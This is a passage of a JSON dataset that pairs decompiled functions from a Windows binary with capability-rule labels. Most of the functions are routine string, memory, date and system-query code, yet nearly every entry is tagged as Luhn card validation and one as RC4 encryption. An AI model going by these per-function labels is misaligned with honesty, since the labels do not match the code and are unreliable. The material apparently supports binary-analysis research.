(*(pcVar2 + iVar7) == *(pcVar3 + iVar7 + 1)) {\n                        bVar8 = SCARRY4(iVar7, 2);\n                        iVar7 = iVar7 + 2;\n                        if (bVar8 == iVar7 < 0) {\n                            if (pcVar3 + 2 <= pcVar6) {\n                                return pcVar3 + 2 + -pcVar4;\n                            }\n                            return NULL;\n                        }\n                    }\n                }\n                if (pcVar6 <= pcVar3) {\n                    return NULL;\n                }\n                goto code_r0x00405480;\n            }\n            pcVar2 = pcVar4;\n            while (cVar1 != *pcVar2) {\n                if (cVar1 == pcVar2[1]) {\ncode_r0x0040543c:\n                    pcVar3 = NULL;\n                    if (pcVar2 + 2 <= pcVar6) {\n                        pcVar3 = pcVar2 + 2 + -pcVar4;\n                    }\n                    return pcVar3;\n                }\n                pcVar2 = pcVar2 + 2;\n                if (pcVar2 < pcVar6 + -2) {\n                    do {\n                        if (cVar1 == *pcVar2) goto code_r0x0040542c;\n                        if (cVar1 == pcVar2[1]) goto code_r0x0040543c;\n                        if (cVar1 == pcVar2[2]) {\n                            pcVar2 = pcVar2 + 2;\n                            goto code_r0x0040542c;\n                        }\n                        if (cVar1 == pcVar2[3]) {\n                            pcVar2 = pcVar2 + 2;\n                            goto code_r0x0040543c;\n                        }\n                        pcVar2 = pcVar2 + 4;\n                    } while (pcVar2 < pcVar6 + -2);\n                    if (pcVar6 <= pcVar2) {\n                        return NULL;\n                    }\n                }\n                else if (pcVar6 <= pcVar2) {\n                    return NULL;\n                }\n            }\ncode_r0x0040542c:\n            return pcVar2 + (1 - pcVar4);\n        }\n    }\n    return NULL;\ncode_r0x004054cf:\n    while (*(pcVar2 + iVar7) == *(pcVar3 + iVar7)) {\n        bVar8 = SCARRY4(iVar7, 2);\n        iVar7 = iVar7 + 2;\n        if (bVar8 == iVar7 < 0) {\n            return pcVar3 + (1 - pcVar4);\n        }\n    }\n    goto code_r0x00405484;\n}\n",
        "token_count": 1095
    },
    "00405598": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405598(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        if (iVar1 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar1);\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 127
    },
    "004056d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004056d0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    \n    arg_8h = 0;\n    if (param_2 != 0) {\n        arg_8h = *(param_2 + -4);\n    }\n    if (arg_8h < 1) {\n        fcn.00405580(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00404ee0(arg_8h),  0 < iVar1)) {\n        fcn.00405670();\n    }\n    else {\n        fcn.004057cc();\n        fcn.00404ee0(arg_8h);\n        fcn.004057cc();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "004057cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004057cc(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (0 < param_2) {\n        fcn.00405558();\n        iVar1 = fcn.004056f0();\n        if (0 < iVar1) {\n            fcn.00402ee0();\n        }\n    }\n    fcn.00405570();\n    return;\n}\n",
        "token_count": 95
    },
    "00405810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405810(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.00405840();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 122
    },
    "004058e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004058e0(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.0040592c();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 124
    },
    "00405c78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00405c78(uint param_1, int32_t param_2, uint32_t param_3, int32_t param_4)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX * param_3 & 0xffffffff | (in_EAX * param_3 >> 0x20) + param_4 * in_EAX + param_2 * param_3 << 0x20;\n}\n",
        "token_count": 100
    },
    "00405e58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405e58(void)\n\n{\n    fcn.00405ccc(&stack0x00000004);\n    return;\n}\n",
        "token_count": 31
    },
    "00405ec8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.00405ec8(void)\n\n{\n    uchar *puVar1;\n    uchar auStack28 [4];\n    int32_t iStack24;\n    \n    puVar1 = auStack28;\n    sub.kernel32.dll_VirtualQuery();\n    if (iStack24 != 0x1000) {\n        puVar1 = NULL;\n    }\n    return puVar1;\n}\n",
        "token_count": 85
    },
    "00406a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406a50(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack4104 [4096];\n    \n    if (in_EAX != 0) {\n        if (*(in_EAX + 4) < 0x10000) {\n            uVar1 = fcn.00405f40(*(in_EAX + 4), auStack4104, 0x1000);\n            sub.user32.dll_LoadStringA(uVar1);\n            fcn.00404e90();\n        }\n        else {\n            fcn.00404f98();\n        }\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00406c54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406c54(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX != NULL) {\n        *in_EAX = *in_EAX + param_2;\n        in_EAX[2] = in_EAX[2] + param_2;\n        in_EAX[1] = in_EAX[1] + param_1;\n        in_EAX[3] = in_EAX[3] + param_1;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 131
    },
    "00406c6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406c6c(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    *arg_8h = in_EAX;\n    arg_8h[1] = in_EDX;\n    arg_8h[2] = in_ECX + in_EAX;\n    arg_8h[3] = in_EDX + arg_ch;\n    return;\n}\n",
        "token_count": 114
    },
    "00408ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00408ac0(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    \n    if (in_EAX == 0) {\n        if (param_2 != 0) {\n            in_EAX = -*(param_2 + -4);\n        }\n        return in_EAX;\n    }\n    if (param_2 == 0) {\n        return *(in_EAX - 4);\n    }\n    uVar4 = *(param_2 + -4);\n    uVar10 = *(in_EAX - 4) - uVar4;\n    iVar6 = (-(*(in_EAX - 4) < uVar4) & uVar10) + uVar4;\n    iVar7 = -iVar6;\n    if (iVar7 != 0) {\n        do {\n            uVar1 = *(iVar7 + iVar6 + in_EAX);\n            uVar4 = uVar1;\n            uVar2 = *(iVar7 + param_2 + iVar6);\n            uVar8 = uVar2;\n            if (uVar4 != uVar8) {\n                if (uVar1 != uVar2) {\n                    uVar4 = uVar1 & 0xff;\n                    uVar8 = uVar2 & 0xff;\n                    cVar3 = uVar1 & 0xff;\n                    if (('`' < cVar3) && (cVar3 < '{')) {\n                        uVar4 = uVar4 - 0x20;\n                    }\n                    cVar3 = uVar2 & 0xff;\n                    if (('`' < cVar3) && (cVar3 < '{')) {\n                        uVar8 = uVar8 - 0x20;\n                    }\n                    if (uVar4 - uVar8 != 0) {\n                        return uVar4 - uVar8;\n                    }\n                    uVar4 = *(iVar7 + iVar6 + in_EAX);\n                    uVar8 = *(iVar7 + param_2 + iVar6);\n                    if (uVar4 >> 8 == uVar8 >> 8) goto code_r0x00408b4e;\n                }\n                uVar5 = uVar4 >> 8;\n                uVar9 = uVar8 >> 8;\n                cVar3 = uVar4 >> 8;\n                if (('`' < cVar3) && (cVar3 < '{')) {\n                    uVar5 = uVar5 - 0x20;\n                }\n                cVar3 = uVar8 >> 8;\n                if (('`' < cVar3) && (cVar3 < '{')) {\n                    uVar9 = uVar9 - 0x20;\n                }\n                if (uVar5 - uVar9 != 0) {\n                    return uVar5 - uVar9;\n                }\n            }\ncode_r0x00408b4e:\n            bVar11 = SCARRY4(iVar7, 2);\n            iVar7 = iVar7 + 2;\n        } while (bVar11 != iVar7 < 0);\n    }\n    return uVar10;\n}\n",
        "token_count": 756
    },
    "00408d88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408d88(uint param_1, uint param_2)\n\n{\n    fcn.00408d3c(param_2);\n    fcn.00404e90();\n    return;\n}\n",
        "token_count": 48
    },
    "00408da8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408da8(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cVar8;\n    \n    if ((param_1 == '\\0') && (param_1 = 10,  (*(in_EAX + 4) & 0x80000000) != 0)) {\n        fcn.00408ddc(-*in_EAX, -(*(in_EAX + 4) + (*in_EAX != 0)));\n        unaff_ESI[-1] = 0x2d;\n        return;\n    }\n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cVar8 = ROUND(fVar6);\n        uVar2 = cVar8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cVar8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 515
    },
    "00408e74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408e74(uint arg_8h)\n\n{\n    fcn.00408da8();\n    fcn.00404e90();\n    return;\n}\n",
        "token_count": 40
    },
    "00408e9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408e9c(uint param_1)\n\n{\n    fcn.00408d3c(param_1);\n    fcn.00404e90();\n    return;\n}\n",
        "token_count": 44
    },
    "00408f38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408f38(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405c9c();\n    if (iVar1 == 0) {\n        fcn.00405e58(1);\n        fcn.00404df4();\n    }\n    iVar1 = fcn.00405c9c();\n    if (iVar1 == 0) {\n        fcn.00405e58(1);\n        fcn.00404df4();\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "0040904c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040904c(uint param_1, uchar *param_2)\n\n{\n    uint uVar1;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_10h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    uVar1 = fcn.0040a428();\n    if (uVar1 == '\\0') {\n        fcn.00408f38();\n        fcn.00405ca4();\n        uVar1 = fcn.00408fc8(arg_8h);\n        if (uVar1 == '\\0') {\n            fcn.00405ca4();\n            uVar1 = fcn.00408fc8(arg_8h_00);\n            if (uVar1 != '\\0') {\n                *param_2 = 0;\n            }\n        }\n        else {\n            *param_2 = 1;\n        }\n    }\n    else {\n        *param_2 = _var_10h != *0x4090cc;\n    }\n    return uVar1;\n}\n",
        "token_count": 267
    },
    "00409190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00409190(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4091aa;\n    fcn.00405810();\n    uStack28 = 0x4091f6;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00404da0();\n    fcn.004063cc();\n    fcn.00404df4();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4091fd;\n    uStack28 = 0x4091f5;\n    fcn.004058e0();\n    return;\n}\n",
        "token_count": 193
    },
    "0040949c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040949c(void)\n\n{\n    uint uVar1;\n    uchar auStack272 [4];\n    uchar auStack268 [260];\n    \n    uVar1 = fcn.00405264(0x104, auStack268, auStack272);\n    sub.kernel32.dll_GetFullPathNameA(uVar1);\n    fcn.00404e90();\n    return;\n}\n",
        "token_count": 85
    },
    "004094d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk size"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004094d8(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    uVar1 = sub.kernel32.dll_GetDiskFreeSpaceA(arg_8h, &var_4h, &var_8h, &var_ch, &var_10h);\n    uVar2 = fcn.00405c78(var_ch, 0);\n    *arg_ch = uVar2;\n    arg_ch[1] = uVar2 >> 0x20;\n    uVar2 = fcn.00405c78(var_10h, 0);\n    *arg_10h = uVar2;\n    arg_10h[1] = uVar2 >> 0x20;\n    return uVar1;\n}\n",
        "token_count": 248
    },
    "004097a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004097a4(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00402ce4();\n    *piVar1 = in_EAX + 4;\n    return piVar1 + 1;\n}\n",
        "token_count": 69
    },
    "0040a376": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a376(void)\n\n{\n    int32_t unaff_EBP;\n    char *unaff_ESI;\n    uint var_ch;\n    \n    while( true ) {\n        if (*unaff_ESI - 0x3aU < 0xf6) break;\n        *(unaff_EBP + -0xc) = *unaff_ESI - 0x30;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0040a392": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a392(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *unaff_ESI;\n    \n    uVar2 = 0;\n    if ((*unaff_ESI == '+') || (*unaff_ESI == '-')) {\n        unaff_ESI = unaff_ESI + 1;\n    }\n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 - 0x3aU < 0xf6) {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n        uVar2 = uVar2 * 10 + (cVar1 - 0x30);\n    } while (uVar2 < 500);\n    return;\n}\n",
        "token_count": 169
    },
    "0040a3c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a3c8(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.00409db4(0, 0xf, 0);\n    fcn.00404e90();\n    return;\n}\n",
        "token_count": 59
    },
    "0040a3f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a3f8(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.00409db4(0, 0, 0);\n    fcn.00404e90();\n    return;\n}\n",
        "token_count": 58
    },
    "0040a444": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a444(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.00405264();\n    cVar1 = fcn.0040a2b4();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0040a470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a470(uint param_1, float *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.00405264();\n    cVar1 = fcn.0040a2b4();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0040a4b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a4b8(double param_1)\n\n{\n    uint64_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    uVar1 = ROUND(param_1 * *0x49088c);\n    iStack16 = uVar1;\n    iStack12 = uVar1 >> 0x20;\n    if (uVar1 < 0) {\n        uVar1 = CONCAT44(-(iStack16 != 0) - iStack12, -iStack16);\n        uVar3 = uVar1 % *0x490890;\n        iVar2 = -(uVar1 / *0x490890);\n    }\n    else {\n        iVar2 = uVar1 / *0x490890;\n        uVar3 = uVar1 % *0x490890;\n    }\n    *in_EAX = uVar3;\n    in_EAX[1] = iVar2 + 0xa955a;\n    return;\n}\n",
        "token_count": 235
    },
    "0040a4fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0040a4fc(double *arg_8h, uint arg_ch)\n\n{\n    uint16_t in_AX;\n    uint16_t in_CX;\n    uint16_t in_DX;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((in_AX < 0x18) && (in_DX < 0x3c)) && (in_CX < 0x3c)) && (arg_ch < 1000)) {\n        *arg_8h = (in_AX * 3600000 + in_DX * 60000 + in_CX * 1000 + arg_ch) / *0x40a568;\n        var_1h._0_1_ = 1;\n    }\n    return var_1h;\n}\n",
        "token_count": 211
    },
    "0040a56c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a56c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint in_EDX;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040a4b8(arg_ch, arg_10h, &var_4h);\n    fcn.00408820(arg_ch);\n    fcn.00408820(in_EDX);\n    fcn.00408820(arg_8h);\n    return;\n}\n",
        "token_count": 109
    },
    "0040a6d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040a6d0(int16_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int16_t *in_EAX;\n    int32_t iVar4;\n    uint16_t *in_EDX;\n    uint32_t uVar5;\n    int16_t iVar6;\n    uint var_18h;\n    int32_t var_14h;\n    int16_t var_10h;\n    uint16_t var_eh;\n    int16_t *var_ch;\n    uint16_t *var_8h;\n    int16_t *var_4h;\n    \n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    fcn.0040a4b8(arg_ch, arg_10h);\n    if (var_14h < 1) {\n        *var_4h = 0;\n        *var_8h = 0;\n        *var_ch = 0;\n        *arg_8h = 0;\n        uVar5 = 0;\n    }\n    else {\n        *arg_8h = var_14h % 7 + 1;\n        iVar6 = 1;\n        for (iVar4 = var_14h + -1; 0x23ab0 < iVar4; iVar4 = iVar4 + -0x23ab1) {\n            iVar6 = iVar6 + 400;\n        }\n        fcn.00408820(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x8eac;\n        }\n        iVar2 = var_10h * 0x68;\n        fcn.00408820(&var_eh);\n        fcn.00408820(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x16d;\n        }\n        uVar5 = fcn.0040a5c8();\n        uVar3 = 1;\n        for (; uVar1 = *((uVar5 & 0xff) * 0x18 + 0x4907ea + uVar3 * 2),  uVar1 <= var_eh; var_eh = var_eh - uVar1) {\n            uVar3 = uVar3 + 1;\n        }\n        *var_4h = iVar6 + iVar2 + var_10h;\n        *var_8h = uVar3;\n        *var_ch = var_eh + 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 608
    },
    "0040a83c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a83c(uint arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0040a4b8(arg_8h, arg_ch);\n    return var_4h % 7 + 1;\n}\n",
        "token_count": 74
    },
    "0040a864": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040a864(void)\n\n{\n    uchar auStack16 [16];\n    \n    sub.kernel32.dll_GetLocalTime();\n    return auStack16 & 0xffff;\n}\n",
        "token_count": 43
    },
    "0040a878": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a878(int32_t arg_8h)\n\n{\n    int32_t in_EDX;\n    int32_t iVar1;\n    \n    iVar1 = 0x100 - *(arg_8h + -0x104);\n    if (in_EDX < iVar1) {\n        iVar1 = in_EDX;\n    }\n    if (iVar1 != 0) {\n        fcn.00402ee0();\n    }\n    *(arg_8h + -0x104) = *(arg_8h + -0x104) + iVar1;\n    return;\n}\n",
        "token_count": 130
    },
    "0040a8d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a8d8(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch._0_1_ = 0;\n    var_14h._0_1_ = 0;\n    arg_8h_00 = 1;\n    fcn.00409888(1, &var_20h, 4);\n    fcn.0040a878(arg_8h_00);\n    return;\n}\n",
        "token_count": 152
    },
    "0040b414": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b414(uint param_1, int32_t param_2)\n\n{\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    \n    if (param_2 == 0) {\n        fcn.0040ac5c(&stack0xfffffffc);\n    }\n    else {\n        fcn.0040ac5c(&stack0xfffffffc);\n    }\n    fcn.00404e90();\n    return;\n}\n",
        "token_count": 107
    },
    "0040b688": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040b688(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    while( true ) {\n        uVar3 = fcn.00405060();\n        if ((uVar3 < *param_2) || (cVar1 = *(in_EAX + -1 + *param_2),  uVar3 = cVar1 - 0x3a,  cVar1 - 0x30U < 10))\n        break;\n        uVar3 = *(in_EAX + -1 + *param_2);\n        if ((*((uVar3 >> 3) + 0x49081c) >> (uVar3 & 7) & 1) == 0) {\n            *param_2 = *param_2 + 1;\n        }\n        else {\n            iVar2 = fcn.0040d200();\n            *param_2 = iVar2;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 244
    },
    "0040bd98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040bd98(void)\n\n{\n    int32_t iVar1;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack276;\n    uchar *puStack272;\n    uint uStack268;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0;\n    uStack268 = 0x100;\n    puStack272 = &stack0xfffffefc;\n    uStack276 = 0;\n    uStack284 = 0;\n    uStack288 = 0x3200;\n    uStack292 = 0x40bdbc;\n    for (iVar1 = sub.kernel32.dll_FormatMessageA();\n        (0 < iVar1 && (((&stack0xfffffedf)[iVar1] < 0x21 || ((&stack0xfffffedf)[iVar1] == 0x2e)))); iVar1 = iVar1 + -1)\n    {\n    }\n    uStack292 = 0x40bddc;\n    fcn.00404e90();\n    return;\n}\n",
        "token_count": 235
    },
    "0040bde4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bde4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (iVar1 < 1) {\n        fcn.00404df4();\n    }\n    else {\n        fcn.00404e90();\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0040be98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
